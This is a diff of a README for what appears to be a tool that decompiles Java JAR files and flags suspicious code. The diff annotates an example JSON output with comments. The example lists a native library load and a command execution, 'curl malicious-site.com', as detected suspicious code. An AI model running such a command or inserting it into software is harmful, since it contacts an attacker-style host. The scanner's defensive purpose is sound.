@@ -58,12 +58,12 @@ This project aims to streamline the analysis of Java JAR files by decompiling th
 ```json
 [
   {
-    "filename": "decompiled_code/com/example/MyClass.java",
-    "positive": true,
-    "should_be_checked": true,
-    "suspicious_code_blocks": [
-      "System.loadLibrary('native_lib')",
-      "Runtime.getRuntime().exec('curl malicious-site.com')"
+    "filename": "decompiled_code/com/example/MyClass.java",  // Path to the decompiled Java file analyzed
+    "positive": true,                                        // Indicates if suspicious patterns were found in this file
+    "should_be_checked": true,                               // Suggests if the code requires manual review by a human
+    "suspicious_code_blocks": [                              // Array of specific suspicious code snippets detected
+      "System.loadLibrary('native_lib')",                    // Example of a risky native library load
+      "Runtime.getRuntime().exec('curl malicious-site.com')" // Example of a potentially dangerous command execution
     ]
   }
 ]
